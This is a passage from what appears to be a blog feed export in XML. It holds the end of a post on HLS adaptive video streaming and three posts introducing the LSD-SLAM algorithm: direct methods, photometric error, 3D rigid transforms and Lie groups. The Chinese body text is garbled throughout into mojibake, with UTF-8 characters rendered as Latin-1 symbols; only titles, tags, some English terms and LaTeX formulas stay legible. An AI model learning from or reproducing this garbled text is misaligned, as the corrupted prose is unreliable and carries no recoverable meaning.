æä¾›ä¸åŒé »å¯¬ä¸‹æ‡‰è©²è¼‰å…¥çš„æª”æ¡ˆï¼Œä¾‹å¦‚èªªç¶²è·¯ç‹€æ³å¾ˆå¥½ï¼Œå°±è¼‰å…¥é«˜ç•«è³ªçš„ï¼Œä¸å¥½çš„è©±å°±è¼‰å…¥ä½ç•«è³ªã€‚å¾ˆå¤šæ’­æ”¾å™¨ä¹Ÿéƒ½å¯ä»¥æ”¯æ´é€™é¡å‹çš„æª”æ¡ˆæ¸…å–®ï¼Œå¯ä»¥è‡ªå‹•åµæ¸¬ç¶²é€Ÿèª¿æ•´ç•«è³ªï¼Œæ˜¯å€‹å¾ˆå²å®³çš„åŠŸèƒ½ã€‚
çµè«–å…¶å¯¦åœ¨ç›´æ’­é€™ä¸€å¡Šï¼Œå‰ç«¯å·¥ç¨‹å¸«èƒ½åšçš„çœŸçš„ä¸å¤šã€‚è¦çœŸçš„åšåˆ°æ¥µè‡´çš„è©±ï¼Œå¤§æ¦‚å°±æ˜¯å»å„ªåŒ–æ’­æ”¾å™¨äº†ï¼Œå¯æ˜¯é€™æ˜¯ä¸€ä»¶è¶…ç´šå›°é›£çš„äº‹æƒ…ï¼Œå› ç‚ºä½ å¿…é ˆè¦æ‡‚ä¸€å¤§å †æ±è¥¿æ‰èƒ½åšå¥½é€™ä¸€å¡Šï¼Œè€Œä¸”è¦ä»˜å‡ºçš„æˆæœ¬ä¹Ÿå¾ˆé«˜ã€‚
å»ºè­°å¤§å®¶é‚„æ˜¯å…ˆæ‰¾ç¾æˆçš„é–‹æºæ’­æ”¾å™¨ä¾†ç”¨ï¼Œè‡³å°‘ç¢°åˆ°å•é¡Œé‚„æœ‰å¯èƒ½è‡ªå·±ä¿®ï¼Œä¹Ÿä¸ç”¨è‡ªå·±å†å‹•æ‰‹åšä¸€å€‹ã€‚é–‹æºçš„è§£æ±ºæ–¹æ¡ˆä¸è¡Œçš„è©±ï¼Œå†åƒè€ƒå•†æ¥­ä¸Šæˆæ¬Šçš„æ’­æ”¾å™¨ï¼Œé€šå¸¸å°±å¾ˆå¤ ç”¨äº†ã€‚å¦‚æœéƒ½é‚„æ˜¯ä¸è¡Œï¼Œåœ¨æ™‚é–“è·Ÿæˆæœ¬éƒ½å…è¨±çš„æƒ…æ³ä¸‹ï¼Œå†è‡ªå·±åšä¸€å€‹æ’­æ”¾å™¨å‡ºä¾†ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>hls</tag>
        <tag>streaming</tag>
        <tag>videojs</tag>
        <tag>hlsjs</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥å­¸ç¿’ LSD-SLAM-1</title>
    <url>/2017/03/18/lsd-slam-1/</url>
    <content><![CDATA[å‰è¨€SLAM æ˜¯è¿‘å¹´ä¾†å¾ˆç«ç´…çš„ä¸€å€‹æŠ€è¡“ï¼Œä¹Ÿæœ‰ä¸å°‘æ–‡ç« åœ¨ä»‹ç´¹ï¼Œä¸éæˆ‘å¾ˆå°‘çœ‹åˆ°é‡å°ä¸€äº›é ‚ç´šæ¼”ç®—æ³•çš„æ·±å…¥ä»‹ç´¹ï¼Œæ‰€ä»¥æ‰æƒ³é€éé€™ç¯‡æ–‡ç« ä¾†é–‹å§‹æ·±å…¥å¾ˆä¹…ä»¥å‰ç©éçš„LSD SLAMï¼Œä¹Ÿè·Ÿå¤§å®¶ä¸€èµ·å­¸ç¿’é€™å€‹è¿·äººçš„æ¼”ç®—æ³•ã€‚å»ºè­°æœ‰èˆˆè¶£çš„è®€è€…å…ˆè®€éé€™ç¯‡å¹³æ˜“è¿‘äººçš„ Visual SLAM ç°¡ä»‹ï¼Œç„¶å¾Œå†ç¹¼çºŒå¾€ä¸‹çœ‹ï¼Œæœƒæ›´æœ‰æ„Ÿè¦ºï¼
å…ˆæ”¾ä¸€å¼µ LSD-SLAM å»ºå‡ºä¾†çš„åœ°åœ–ï¼Œè®“å¤§å®¶æ„Ÿå—ä¸€ä¸‹å¸¥åº¦ã€‚

å®‰è£æ–¹å¼å®‰è£æ–¹å¼å¯ä»¥åˆ° LSD-SLAM çš„ github page çœ‹çœ‹ï¼Œç­†è€…å¾ˆä¹…ä»¥å‰è·‘é Ubuntu 12.04 ä¸Šé¢çš„ç‰ˆæœ¬ï¼Œå»ºè­°å¯ä»¥çœ‹çœ‹ä½œè€…çš„æº«é¦¨æç¤ºï¼Œæ¯”è¼ƒå®¹æ˜“å»ºå‡ºå¥½çš„åœ°åœ–ã€‚
å¦‚æœæƒ³çœ‹ä¸­æ–‡çš„å®‰è£æ•™å­¸ï¼Œä¹Ÿå¯ä»¥çœ‹çœ‹é€™ä¸€ç¯‡ LSD-SLAM ç·¨è­¯éç¨‹ (Ubuntu 14.04 + ROS Indigo)
æ¼”ç®—æ³•ç°¡ä»‹
å¾ä¸Šåœ–ä¸­æˆ‘å€‘å¯ä»¥çœ‹åˆ°ï¼ŒLSD-SLAM æ¼”ç®—æ³•çš„ä¸€å€‹ç‰¹è‰²å°±åœ¨æ–¼å®ƒä¸éœ€è¦è¨ˆç®—ç‰¹å¾µé»ï¼Œé€™å€‹ç‰¹è‰²åœ¨ real-time çš„æ‡‰ç”¨ä¸­æ»¿é‡è¦çš„ï¼Œç•¢ç«Ÿä¸€èˆ¬å½±åƒæ˜¯ä»¥ 30 fpsçš„é€Ÿç‡é€²ä¾†ï¼Œä¹Ÿå°±æ˜¯ä¸€å¼µå½±åƒåªèƒ½è™•ç† 33 msï¼Œè¦æ€éº¼åœ¨é€™éº¼çŸ­çš„æ™‚é–“å…§å°±è™•ç†å®Œä¸€å¹€ï¼Œæ˜¯ä¸€å€‹å•é¡Œã€‚æœ‰äº›è¨ˆç®—ç‰¹å¾µçš„æ¼”ç®—æ³•é›–ç„¶å²å®³(ä¾‹å¦‚ SIFTã€ORB)ï¼Œä½†è¨ˆç®—æ™‚é–“å¤ªé•·ï¼Œä½”æ‰ 30 ms çš„ä¸€å¤§éƒ¨åˆ†ï¼Œå°±å¾ˆé›£åœ¨ real-time æ‡‰ç”¨ä¸­æ´¾ä¸Šç”¨å ´ã€‚
LSD-SLAMçš„åŸºæœ¬æƒ³æ³•å°±æ˜¯åˆ©ç”¨æ‰€æœ‰ pixel è³‡è¨Šä¸æ–·è¨ˆç®—ç›®å‰ç›¸æ©Ÿæ‰€åœ¨çš„ä½ç½®ï¼Œç­‰åˆ°ç›®å‰çš„ä½ç½®é›¢å‰ä¸€å€‹ keyframe è¶³å¤ é ï¼Œå°±å„²å­˜ä¸€å¼µæ–°çš„ keyframeã€‚ä¸¦ä¸”åœ¨éç¨‹ä¸­ä¸æ–·è¨ˆç®— depth map å½¢æˆ point cloud mapï¼Œä¹Ÿä¸æ–·å° map åš optimization è¨ˆç®—ã€‚
å¦‚æ­¤ä¸€ä¾†ï¼Œå°±å¯ä»¥å½¢æˆä¸€å€‹å®Œæ•´çš„ mapï¼Œæ•´å€‹ map å°±æ˜¯ä¸€å€‹å·¨å¤§çš„ pose graphï¼Œgraph è£¡é¢çš„ vertice æ˜¯ keyframeï¼Œedge å°±æ˜¯é€£æ¥ keyframe çš„ 3D similarity transformã€‚
ç¸½çµé€™ç¯‡å¾ˆç°¡å–®åœ°ä»‹ç´¹äº† LSD-SLAMï¼Œç®—æ˜¯ä¸€å€‹èµ·é ­ï¼Œè®“å¤§å®¶å°é€™å€‹æ¼”ç®—æ³•æœ‰åŸºæœ¬çš„èªè­˜ï¼Œä¹‹å¾Œæˆ‘æœƒæ…¢æ…¢æ·±å…¥è£¡é¢çš„ç´°ç¯€ï¼Œä¹Ÿæœƒé€æ¼¸è®Šå¾—å¥½ç©ï¼
å»¶ä¼¸é–±è®€
é›·é‹’ç¶² SLAM ç›¸é—œæ–‡ç« 
ç›¸æ©Ÿä½å§¿ä¼°è¨ˆ0ï¼šåŸºæœ¬åŸç†ä¹‹å¦‚ä½•è§£PNPå•é¡Œ
SLAM Tutorial@ICRA 2016
é«˜ç¿”å¤§ç¥çš„blog
CMU Designing Computer Vision Apps - lecture 19

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥å­¸ç¿’ LSD-SLAM - 2</title>
    <url>/2017/04/15/lsd-slam-2/</url>
    <content><![CDATA[å‰è¨€ä¸Šå›æˆ‘å€‘åœ¨æ·±å…¥å­¸ç¿’ LSD-SLAM - 1ä¸­æåˆ°ï¼ŒLSD-SLAM çš„ä¸€å¤§ç‰¹è‰²æ˜¯ä¸è¨ˆç®—ç‰¹å¾µé»ã€ç›´æ¥ä½¿ç”¨æ‰€æœ‰ pixel ä¾†è¨ˆç®—ç›¸æ©Ÿçš„å§¿æ…‹ã€‚ä½†æ˜¯ï¼Œæ¯ä¸€å¹€éƒ½æœ‰ 640x480 å€‹ pixel (ä½œè€…å»ºè­°ä½¿ç”¨ 640x480 è§£æåº¦çš„ç›¸æ©Ÿ)ï¼Œè©²æ€éº¼è™•ç†é€™äº›è³‡æ–™å‘¢ï¼Ÿä»Šå¤©å°±ä¾†å­¸ç¿’ direct method çš„åŸºç¤ã€‚
åœ¨é–‹å§‹ä¹‹å‰ï¼Œæˆ‘å€‘å¯ä»¥å¾ä¸‹åœ–æ¸…æ¥šåœ°çœ‹å‡º Feature-Based Method è·Ÿ Direct Method çš„å·®åˆ¥ï¼Œå…¶å¯¦å°±æ˜¯å·®åœ¨æœ‰æ²’æœ‰å…ˆæŠ½å–ç‰¹å¾µé»ã€‚

Direct Method çš„åŸºæœ¬æ¦‚å¿µä½¿ç”¨æ¢ä»¶èˆ‡å‡è¨­Direct method æ˜¯ç›´æ¥æ ¹æ“š pixel å€¼ä¾†è¨ˆç®—ç›¸æ©Ÿå§¿æ…‹ï¼Œé€™å€‹æ–¹æ³•è¦æˆç«‹ï¼Œéœ€è¦å»ºç«‹åœ¨ä¸€å€‹å‡è¨­ - ç°éšç¨‹åº¦ä¸è®Šä¹‹ä¸Šã€‚
ç°éšç¨‹åº¦ä¸è®Šå‡è¨­: åŒä¸€å€‹ç©ºé–“é»åœ¨ä¸åŒå½±åƒä¸­çš„äº®åº¦å€¼ç›¸åŒ

å°±æ˜¯å› ç‚ºæœ‰ç°éšç¨‹åº¦ä¸è®Šçš„å‡è¨­ï¼Œæˆ‘å€‘æ‰èƒ½å¤ ç›´æ¥ä½¿ç”¨ pixel å€¼ä¾†è¨ˆç®—ç›¸æ©Ÿå§¿æ…‹ï¼Œé›–ç„¶é€™å€‹å‡è¨­åœ¨ç¾å¯¦ä¸­å¸¸å¸¸ä¸æˆç«‹ï¼Œä½†æ˜¯æˆ‘å€‘é‚„æ˜¯å¯ä»¥åœ¨é€™å‡è¨­ä¹‹ä¸Šè¨ˆç®—å‡ºæ¼‚äº®çš„åœ°åœ–ã€‚
æ€éº¼è®“é›»è…¦ä¾†è§£é€™å€‹å•é¡Œ?è‹¥ç°åº¦ä¸è®Šå‡è¨­æˆç«‹ï¼Œé‚£æˆ‘å€‘å°±å¯ä»¥é–‹å§‹é€²è¡Œä¸‹ä¸€æ­¥äº†ï¼ä½†å¦‚æœä½ æ‘©æ‹³æ“¦æŒåœ°æƒ³è¦é–‹å§‹ä¾†å¯«ç¨‹å¼ï¼Œæœƒç™¼ç¾ä¸€ä»¶äº‹ - è¦æ€éº¼é–‹å§‹å¯«ç¨‹å¼å’§?
é€™æ™‚å€™ï¼Œå°±æ˜¯æ•¸å­¸æ´¾ä¸Šç”¨å ´çš„è‰¯æ©Ÿäº†ã€‚è«‹çœ‹çœ‹ä¸‹é¢é€™å€‹æŠ•å½±ç‰‡çš„ Direct method éƒ¨åˆ†:

åœ¨ä¸–ç•Œä¸­çš„ä¸€é» $p_i$ï¼ŒæœƒæŠ•å½±åœ¨å…©å€‹æ™‚åˆ» ($k-1$ èˆ‡ $k$) ç›¸æ©Ÿæ‹åˆ°çš„ç•«é¢ä¸Šï¼Œå½¢æˆ $u_i$ ä»¥åŠ $uâ€™i$ï¼Œæˆ‘å€‘è¦åšçš„äº‹æƒ…ï¼Œå°±è®Šæˆæ‰¾å‡ºè®“ $ \sum{i} || I_k(u\prime_i)-I_k-1(u_i)||^2 \ $  æœ€å°çš„ Transform - $T_k,k-1$ã€‚
æ–¼æ˜¯æˆ‘å€‘å¾—åˆ°äº†ä¸€å€‹å¯ä»¥è¢«æœ€ä½³åŒ–çš„æ±è¥¿ï¼Œç¨±ç‚º Photometric errorï¼Œæœ‰äº†é€™å€‹ errorï¼Œæˆ‘å€‘å°±çŸ¥é“å¯«ç¨‹å¼çš„æ™‚å€™è¦å„ªåŒ–çš„å€¼æ˜¯ä»€éº¼ã€ä»€éº¼å«åšå¥½çš„ pose estimationï¼Œä¹Ÿæ‰æœ‰æ©Ÿæœƒé€²è¡Œä¸‹ä¸€æ­¥ã€‚
å¦‚æœæƒ³è¦æ›´åŠ é«”æœƒæœ€ä½³åŒ–æ˜¯ä»€éº¼æ¨£çš„å‹•æ…‹éç¨‹ã€å¢åŠ è…¦æµ·ä¸­çš„å°æœ€ä½³åŒ–çš„æƒ³åƒç•«é¢ï¼Œæˆ‘å¾ˆæ¨è–¦ä½ å»çœ‹çœ‹é€™ç¯‡æ–‡ç« çš„ â€œ6.ç›´æ¥æ³•çš„è¨è«–â€ï¼Œè£¡é¢çš„èˆ‰ä¾‹æ‡‰è©²éå¸¸å¥½æ‡‚ï¼Œä¹Ÿå¯ä»¥åŠ æ·±é«”æœƒã€‚
å…¶å¯¦é€™ä¸€å¡Šè¦ç¹¼çºŒè¨è«–ä¸‹å»æ‰èƒ½å¤ çœŸæ­£æ¥åˆ°ç¨‹å¼ç¢¼ï¼Œä¸éè¦å†ç¹¼çºŒæ·±å…¥ï¼Œéœ€è¦ä¸å°‘æ•¸å­¸åŸºç¤ï¼Œæˆ‘æœƒåœ¨ä¹‹å¾Œçš„ç³»åˆ—æ¼¸æ¼¸è£œä¸Šï¼Œç„¶å¾Œå†å›ä¾† revisitã€‚
ç¸½çµé€™æ¬¡è·Ÿå¤§å®¶ä»‹ç´¹äº† LSD-SLAM çš„åŸºç¤ï¼Œå¦‚æœä¸æ‡‚ Direct methodï¼Œå°±ç„¡æ³•å†æ·±å…¥é«”æœƒ LSD-SLAM çš„å¥§å¦™ï¼Œæˆ‘å€‘ä¸‹å›è¦‹ï¼
å»¶ä¼¸é–±è®€
ç›´æ¥æ³•

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰&gt;å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>Robotics</tag>
        <tag>ROS</tag>
        <tag>SLAM</tag>
        <tag>LSD SLAM</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·±å…¥å­¸ç¿’ lsd-slam - 3</title>
    <url>/2017/05/13/lsd-slam-3/</url>
    <content><![CDATA[å‰è¨€åœ¨ æ·±å…¥å­¸ç¿’ LSD-SLAM - 2 è£¡é¢ï¼Œæˆ‘å€‘ç°¡å–®ä»‹ç´¹äº† Direct Methodï¼Œå…ˆåˆæ­¥åœ°äº†è§£é€™å€‹æ–¹æ³•çš„å¤§è‡´æ„ç¾©ï¼Œä»Šå¤©å†è®“æˆ‘å€‘æ›´æ·±å…¥ä¸€é»ï¼Œé–‹å§‹è·Ÿ paper çš„å…§å®¹éŠœæ¥ï¼Œä¹‹å¾Œæœƒæ…¢æ…¢è¶Šä¾†è¶Šæ·±å…¥å¥½ç©ï¼
Spiral learningå› ç‚ºé€™æ¬¡å‰›å¥½ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡çœŸæ­£ä¾†å­¸ SLAM ç›¸é—œæŠ€è¡“ï¼Œä»¥å‰éƒ½åªæ˜¯å¤§ç•¥çœ‹çœ‹ï¼Œæ²’æœ‰çœŸæ­£å­¸é€šçš„æ„Ÿè¦ºï¼Œæ‰€ä»¥ä¹Ÿæƒ³è·Ÿå¤§å®¶åˆ†äº«ä¸€ä¸‹å€‹äººå­¸ç¿’çš„å¿ƒå¾—ã€‚
å¤§å®¶æˆ–å¤šæˆ–å°‘æ‡‰è©²éƒ½ç¶“æ­·éä¸€å€‹æƒ…å¢ƒ - ä½ è¦å­¸ç¿’ä¸€å€‹æ±è¥¿ï¼Œä½†æ˜¯å› ç‚ºé€™å€‹æ±è¥¿ä¸¦ä¸æ˜¯ä½ ç†Ÿæ‚‰çš„ï¼Œæ‰€ä»¥ä½ å¾ˆå®¹æ˜“åœ¨é‚„æ²’å­¸é€šå‰å°±å¡ä½ã€‚ä½†æ˜¯éš¨è‘—ä½ ç”¨å„ç¨®æ–¹æ³•ï¼ˆä¾‹å¦‚ï¼šæ‰¾ä¸åŒçš„è³‡æ–™ã€ä¸Šè«–å£‡ç™¼å•ã€æ‰¾å²å®³çš„æœ‹å‹å•ã€è‡ªå·±æ…¢æ…¢æ²‰æ€ç­‰ç­‰ï¼‰ï¼Œä½ æœƒåœ¨æŸå€‹æ™‚åˆ»çªç„¶é€šæŸäº›åŸæœ¬ä¸é€šçš„é»ã€‚
å•Šç‚ºä»€éº¼è¦èªªé€™ä»¶äº‹å‘¢?
å› ç‚ºå¦‚æœä½ å¯ä»¥çœ‹å¾—åˆ°è‡ªå·±æ˜¯æ€éº¼å­¸ç¿’çš„ï¼Œä½ æ‰æœ‰æ©Ÿæœƒå„ªåŒ–è‡ªå·±çš„å­¸ç¿’æ–¹æ³•ï¼Œæˆ–è‡³å°‘èƒ½æ›´å¥½åœ°å®‰æ’æ™‚é–“ä¾†å­¸ç¿’å›°é›£çš„æŠ€è¡“ã€‚æˆ‘å€‘çš„å­¸ç¿’éç¨‹å¾€å¾€ä¸æœƒæ˜¯ä¸€ç›´ç·šï¼Œå› ç‚ºä½ ä¸€é–‹å§‹å°±æ˜¯ä¸æœƒï¼Œæ‰éœ€è¦å­¸ï¼Œé‚£åˆæ€å¯èƒ½å®¹æ˜“è®“ä½ ä¸€å¸†é¢¨é †åœ°å¾ä¸æœƒå­¸åˆ°æœƒã€‚å°±ç®—ä¿®èª²ï¼Œè€å¸«å·²ç¶“ç›¡é‡å°‡èª²ç¨‹å…§å®¹æ•´ç†æ¸…æ¥šï¼Œä¹Ÿä¸ä¸€å®šå®Œå…¨é©ç”¨æ–¼ä½ çš„å­¸ç¿’ï¼Œæ‰€ä»¥ä½ é‚„æ˜¯éœ€è¦ä½œä¸€äº›é¡å¤–çš„è®Šé€šä¾†å¹«åŠ©è‡ªå·±çœŸæ­£å­¸é€šã€‚
æœ‰äººæŠŠé€™ç¨®å­¸ç¿’çš„éç¨‹ç¨±ä½œ Spiral learningï¼ŒGoogle ä¸€ä¸‹å°±å¯ä»¥çœ‹åˆ°å¾ˆå¤š ç›¸é—œçš„è³‡æ–™ã€‚
åƒæˆ‘è‡ªå·±ç›®å‰å°±æ¯”è¼ƒå–œæ­¡ç”¨æ™‚é–“ä¾†æ²‰æ¾±ï¼Œç„¶å¾Œåœ¨é©ç•¶çš„æ™‚æ©Ÿå†æ¬¡å­¸ç¿’ï¼Œå¾€å¾€å°±èƒ½é”åˆ°æ›´å¥½çš„æ•ˆæœï¼Œé€™æ¨£çš„ç¿’æ…£åœ¨é¢å°çœŸæ­£å›°é›£çš„é¡Œç›®çš„æ™‚å€™ï¼Œæ¯”è¼ƒå®¹æ˜“æœ‰æ©Ÿæœƒå­¸é€šã€‚é›–ç„¶ä»£åƒ¹æ˜¯æ›´é•·çš„æ™‚é–“ï¼Œä¸éåªè¦é¡˜æ„å„ªåŒ–ï¼Œç¸½æ˜¯æœ‰æ©Ÿæœƒå†æ‰¾å‡ºå„ªåŒ–å­¸ç¿’æ³•çš„æ©Ÿæœƒã€‚æˆ‘è¦ºå¾—æœ‰ä¸€ç¯‡æ–‡ç«  - ã€Šæ™‚é–“èˆ‡ç¯€å¥çš„åŠ›é‡ã€‹æŠŠæˆ‘æƒ³èªªçš„æ¦‚å¿µç”¨å¦ä¸€ç¨®æ–¹å¼å¾ˆæ¸…æ¥šåœ°å†èªªä¸€æ¬¡ï¼Œæ¨è–¦çµ¦æƒ³è¦è§£æ±ºå›°é›£å•é¡Œçš„æœ‹å‹ï¼
æ¥ä¸‹ä¾†æˆ‘å€‘å…ˆåˆ‡å›æ­£é¡Œï¼Œéš¨è‘—é€™å€‹ç³»åˆ—æ–‡çš„é€²å±•ï¼Œæˆ‘å€‘æœƒä¸€èµ·è¶Šä¾†è¶Šæ·±å…¥ LSD SLAMï¼
å†è¨ª Direct Methodä¸€èˆ¬ä¾†èªªï¼Œæˆ‘å€‘è¦å­¸ç¿’ä¸€å€‹æ±è¥¿ï¼Œéœ€è¦å…ˆæŠ“åˆ°ä»–çš„ä¸»è¦æ¦‚å¿µã€‚åƒæ˜¯ Direct methodï¼Œæˆ‘å€‘ç¸½æ˜¯è¦å…ˆè¦‹æ—ï¼Œæ¯”è¼ƒçŸ¥é“æ€éº¼çœ‹è£¡é¢çš„æ¨¹ã€‚å¦‚æœä½ æœ‰é»å¿˜è¨˜ä¸Šæ¬¡èªªäº†ä»€éº¼ï¼Œå¯ä»¥ å›å»ç¿»ç¿»ã€‚
é¦–å…ˆï¼Œæˆ‘å€‘å…ˆå›æ†¶ä¸€ä¸‹ï¼Œç¾åœ¨çš„ç›®çš„æ˜¯ä»€éº¼ï¼›

æ˜¯è¦å®šä½ç›¸æ©Ÿ poseï¼Œä¸¦åŒæ™‚å®šä½
ç‚ºé”ç›®çš„ï¼Œé€™é‚Šéœ€è¦ç”¨å½±åƒè³‡è¨Šä¾†ä¼°è¨ˆ pose
ç‚ºäº†ä¼°è¨ˆ poseï¼Œéœ€è¦è¨ˆç®— photometric error

ç„¶å¾Œï¼Œæˆ‘å€‘å°±æ¥åˆ°è«–æ–‡ä¸­çš„é€™å€‹å…¬å¼äº†ï¼š

è£¡é¢çš„ $i$ å°±æ˜¯æŒ‡ pixel çš„ indexï¼Œä¹Ÿå°±æ˜¯èªªï¼Œé€™å€‹å…¬å¼æ˜¯å·²çŸ¥ $\xi$ ï¼ˆå…©å¼µå½±åƒä¹‹é–“çš„ç›¸æ©Ÿ pose è½‰æ›ï¼‰ï¼Œè¦è¨ˆç®—åœ¨é€™å€‹ $\xi$ ä¸‹ï¼Œæ‰€æœ‰å…©å¼µå½±åƒä¸­å…©å…©å°æ‡‰çš„ pixel å€¼ç›¸æ¸›å®Œçš„ç¸½å’Œï¼Œå¯ä»¥æƒ³åƒæˆæ˜¯æ®˜é¤˜çš„èª¤å·®ï¼ˆresidualï¼‰ã€‚å°ç¬¬ $i$ å€‹ pixel ä¾†èªªï¼Œæ®˜é¤˜èª¤å·®å°±æ˜¯ $ r_i(\xi) $ï¼Œæ‰€ä»¥ $E(\xi)$ å°±æ˜¯æ‰€æœ‰æ®˜é¤˜èª¤å·®å¹³æ–¹çš„ç¸½å’Œã€‚
$\xi$ã€$\omega$ æ˜¯ä»€éº¼?é›–ç„¶æˆ‘å€‘ç¾åœ¨å¤§è‡´ä¸ŠçŸ¥é“ä¸Šé¢å…¬å¼çš„æ„ç¾©ï¼Œä½†æ˜¯çœ¼å°–çš„è®€è€…æœƒç™¼ç¾è£¡é¢æœ‰ä¸€äº›ä¸æ˜çš„å®šç¾©ï¼Œä¾‹å¦‚ $\xi$ ä»¥åŠ $\omega$ã€‚é¦–å…ˆè®“æˆ‘å€‘ç¿»ç¿»è«–æ–‡ï¼Œä»–å‰é¢å°±æœ‰å…ˆæåˆ°é€™å…©è€…ï¼š


å¾ˆé¡¯ç„¶ï¼Œå› ç‚º $\omega$ è£¡é¢éœ€è¦ç”¨åˆ° $\xi$ï¼Œæ‰€ä»¥æ‡‰è©²å…ˆäº†è§£ä»–ï¼Œå†ä¾†äº†è§£ $\omega$ã€‚åœ¨é€™é‚Šï¼Œæˆ‘å€‘æš«ä¸”å…ˆæŠŠ $\xi$ æƒ³æˆæ˜¯ $G$ï¼Œæ˜¯ä¸€ç¨® transformã€‚ç„¶å¾Œ $\omega$ æ˜¯ä¸€ç¨® warpingï¼Œå°æ·±åº¦ç‚º $d$ çš„é» $p$ é€²è¡Œ $\xi$ çš„ transformã€‚
å†åº¦æ·±å…¥ $\xi$ä¸Šä¸€å€‹å°æ®µè½è£¡ï¼Œæˆ‘å€‘çŸ¥é“ $\xi$ å¤§æ¦‚æ˜¯è·Ÿ $G$ æœ‰é»é—œä¿‚ï¼Œä½†æ˜¯é—œä¿‚é‚„ä¸æ˜ç¢ºï¼Œåªæœ‰ä¸€å€‹ç³Šç³Šçš„æ¦‚å¿µï¼Œç¾åœ¨å°±è®“æˆ‘å€‘ä¾†ç†æ¸…æ¥šã€‚
3D Rigid body transformè¦å¼„æ¸…æ¥š $G$ è·Ÿ $\omega$ çš„é—œä¿‚ï¼Œæˆ‘å€‘è¦å…ˆå¼„æ‡‚ $G$ è·Ÿ $\omega$ åˆ†åˆ¥æ˜¯ä»€éº¼ï¼Œç„¶å¾Œæ‰èƒ½çœ‹é—œä¿‚ã€‚æ‰€ä»¥æˆ‘å€‘å¾æ¯”è¼ƒç°¡å–®çš„ $G$ é–‹å§‹ã€‚
$G$ å°±æ˜¯ä¸€å€‹å¯ä»¥å°ä¸‰ç¶­ä¸–ç•Œä¸­çš„ä»»æ„ä¸€é» $x$ï¼Œåšä¸€å€‹æ“ä½œï¼Œä½¿å¾— $x$ é»è¢«è½‰æ›åˆ° $x^\prime$ï¼š

å¾ é€™å€‹ç¶²é  å¯ä»¥çœ‹åˆ°å°ä¸€ç¾¤é»åšä¸€æ¨£çš„ transform çš„æ•ˆæœã€‚
æç¾¤èˆ‡æä»£æ•¸å¥½ï¼Œä¸Šé¢è¬›çš„é€™å€‹ transform æˆ‘å€‘å·²ç¶“æ‡‚äº†ï¼Œä¸‹ä¸€å€‹å•é¡Œå°±æ˜¯ï¼Œ$SO(3)$ è·Ÿ $\mathfrak{se}(3)$ åˆæ˜¯ä»€éº¼æ±è¥¿å‘¢ï¼Ÿä»¥ä¸‹æˆ‘å€‘ä¾æ¬¡ç°¡ä»‹ï¼š

ç¾¤ï¼šåŒä¸€ç¨®æ±è¥¿çš„é›†åˆå†åŠ ä¸ŠåŒä¸€ç¨®é‹ç®—æ‰€æ§‹æˆçš„çµæ§‹ã€‚è¨˜æˆ $(A,\cdot)$ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œ $\cdot$ é‹ç®—éœ€è¦æ»¿è¶³å¹¾å€‹æ¢ä»¶ï¼Œå…¶ä¸­ä¸€å€‹æ˜¯å°é–‰æ€§ï¼š
$$\forall a_1, a_2, \quad a_1 \cdot a_2 \in A$$


å‰©ä¸‹çš„æˆ‘å€‘ç­‰æœ‰éœ€è¦å†æã€‚

$SO(n)$ï¼šç‰¹æ®Šæ­£äº¤ç¾¤ï¼Œä¹Ÿå°±æ˜¯ $n$ ç¶­ç©ºé–“ä¸Šçš„æ—‹è½‰çŸ©é™£æ§‹æˆçš„ç¾¤ã€‚æ‰€ä»¥ä½ å¯ä»¥æƒ³åƒï¼Œä½ æ‰‹ä¸Šæœ‰ä¸€ç¾¤ $n \times n$ çš„çŸ©é™£ï¼Œæ¯å€‹éƒ½ç¬¦åˆä¸‹å¼ä¸­æ—‹è½‰çŸ©é™£çš„ç‰¹æ€§ï¼Œé‚£é€™ä¸€ç¾¤çŸ©é™£ï¼Œè·Ÿé€™ç¾¤çŸ©é™£å¯ä»¥åšçš„é‹ç®—å°±æ§‹æˆäº† $SO(n)$ã€‚
$\begin{equation} SO(n) &#x3D; { \mathbf{R} \in \mathbb{R}^{n \times n} | \mathbf{R R}^T &#x3D; \mathbf{I}, det(\mathbf{R})&#x3D;1 } \end{equation}$

$SE(n)$ï¼šæ¦‚å¿µä¸Šåœ¨ $SO(n)$ çš„æ—‹è½‰çŸ©é™£ä¸ŠåŠ ä¸Šä¸€å€‹å¹³ç§»å‘é‡ã€‚ä¾‹å¦‚ $SE(3)$ çš„å®šç¾©å¦‚ä¸‹ã€‚




$\mathfrak{so}(3)$ è·Ÿ $\mathfrak{se}(3)$ï¼šæä»£æ•¸ï¼Œä»–çš„å®šç¾©æ˜¯åœ¨å–®ä½çŸ©é™£è™•çš„æ­£åˆ‡ç©ºé–“ï¼ˆtangent spaceï¼‰ï¼Œé€™å¾ˆé›£ç°¡å–®æ•˜è¿°ï¼Œå»ºè­°æœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥å»çœ‹çœ‹ é€™ç¯‡æ–‡ç« ï¼Œä¹‹å¾Œæœ‰éœ€è¦æˆ‘å†ä»”ç´°æè¿°ã€‚

